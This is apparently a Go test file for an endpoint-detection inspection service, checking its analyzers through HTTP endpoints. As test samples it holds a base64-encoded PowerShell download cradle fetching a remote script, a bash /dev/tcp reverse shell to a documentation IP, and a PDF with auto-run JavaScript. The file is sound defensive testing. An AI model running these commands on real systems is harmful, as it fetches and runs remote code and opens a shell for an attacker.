// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"unicode/utf16"
)

func inspectPost(t *testing.T, mux *http.ServeMux, path, ct string, body []byte) InspectReport {
	t.Helper()
	req := httptest.NewRequest("POST", path, bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer tok")
	if ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != 200 {
		t.Fatalf("%s -> %d %s", path, w.Code, w.Body.String())
	}
	var r InspectReport
	if err := json.Unmarshal(w.Body.Bytes(), &r); err != nil {
		t.Fatal(err)
	}
	return r
}

func ps16(s string) string {
	u := utf16.Encode([]rune(s))
	b := make([]byte, 0, len(u)*2)
	for _, c := range u {
		b = append(b, byte(c), byte(c>>8))
	}
	return base64.StdEncoding.EncodeToString(b)
}

func hasAnalyzer(r InspectReport, name string) bool {
	for _, a := range r.Analyzers {
		if a == name {
			return true
		}
	}
	return false
}

// TestInspectEndToEnd checks that every analyzer family is registered and that
// the pieces work together through the real HTTP endpoints.
func TestInspectEndToEnd(t *testing.T) {
	mux := http.NewServeMux()
	RegisterInspect(mux, "tok")

	names := InspectAnalyzerNames()
	want := map[string][]string{
		InspectKindFile:    {"byte-patterns", "file-archive", "file-binary", "file-document", "file-strings"},
		InspectKindScript:  {"byte-patterns", "deobfuscation"},
		InspectKindCmdline: {"deobfuscation"},
		InspectKindDomain:  {"domain"},
	}
	for kind, list := range want {
		have := map[string]bool{}
		for _, n := range names[kind] {
			have[n] = true
		}
		for _, n := range list {
			if !have[n] {
				t.Errorf("analyzer %q not registered for kind %s (have %v)", n, kind, names[kind])
			}
		}
	}

	// 1. An encoded PowerShell download cradle must be decoded, layered and flagged.
	cradle := "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/payload.ps1')"
	r := inspectPost(t, mux, "/v1/inspect/cmdline", "text/plain", []byte("powershell.exe -NoProfile -enc "+ps16(cradle)))
	if len(r.Layers) == 0 {
		t.Fatalf("encoded command was not decoded: %+v", r)
	}
	foundURL, foundCradle := false, false
	for _, i := range r.IOCs {
		if strings.Contains(i.Value, "203.0.113.7") {
			foundURL = true
		}
	}
	for _, f := range r.Findings {
		if strings.HasPrefix(f.ID, "deob-cradle") {
			foundCradle = true
		}
	}
	if !foundURL || !foundCradle {
		t.Fatalf("expected the decoded URL IOC and a cradle finding: url=%v cradle=%v report=%+v", foundURL, foundCradle, r)
	}
	if r.Level == "clean" {
		t.Fatalf("decoded cradle should not be clean: score=%d", r.Score)
	}

	// 2. A benign script must stay clean through every analyzer.
	benign := "#!/bin/sh\n# build helper\nset -e\nfor f in *.txt; do\n  echo \"processing $f\"\ndone\n"
	r = inspectPost(t, mux, "/v1/inspect/script", "text/plain", []byte(benign))
	if r.Level != "clean" || len(r.Errors) != 0 {
		t.Fatalf("benign script flagged or errored: level=%s score=%d errors=%v findings=%+v", r.Level, r.Score, r.Errors, r.Findings)
	}

	// 3. A reverse-shell script is caught by the byte-pattern rules, with IOCs.
	rs := "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"
	r = inspectPost(t, mux, "/v1/inspect/script", "text/plain", []byte(rs))
	byteHit := false
	for _, f := range r.Findings {
		if strings.HasPrefix(f.ID, "byte-") {
			byteHit = true
		}
	}
	if !byteHit || r.Score == 0 {
		t.Fatalf("reverse shell not detected by byte rules: %+v", r)
	}

	// 4. File path: format detected, strings and IOCs extracted, no analyzer errors.
	file := []byte("%PDF-1.4\n1 0 obj<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>endobj\nhttp://203.0.113.11/x\n")
	r = inspectPost(t, mux, "/v1/inspect/file?name=x.pdf", "application/octet-stream", file)
	if r.Format == "" || len(r.Errors) != 0 {
		t.Fatalf("file inspection failed: format=%q errors=%v", r.Format, r.Errors)
	}
	if !hasAnalyzer(r, "file-document") || !hasAnalyzer(r, "file-strings") {
		t.Fatalf("expected document and strings analyzers to run: %v", r.Analyzers)
	}

	// 5. Domain: invalid input is reported, not crashed; a DGA-looking name scores.
	r = inspectPost(t, mux, "/v1/inspect/domain", "text/plain", []byte("xkqzjvwpbtnmrhcfy.com"))
	if r.Kind != "domain" || len(r.Errors) != 0 || len(r.Findings) == 0 {
		t.Fatalf("domain inspection: %+v", r)
	}
	r = inspectPost(t, mux, "/v1/inspect/domain", "text/plain", []byte("not a domain!!"))
	if len(r.Errors) != 0 {
		t.Fatalf("invalid domain must be a finding, not an error: %v", r.Errors)
	}

	// 6. Nothing about the submitted bytes may be retained anywhere in the ring.
	req := httptest.NewRequest("GET", "/v1/inspect/reports", nil)
	req.Header.Set("Authorization", "Bearer tok")
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if strings.Contains(w.Body.String(), "app.alert(1)") || strings.Contains(w.Body.String(), "build helper") {
		t.Fatal("submitted content leaked into the stored reports")
	}
}
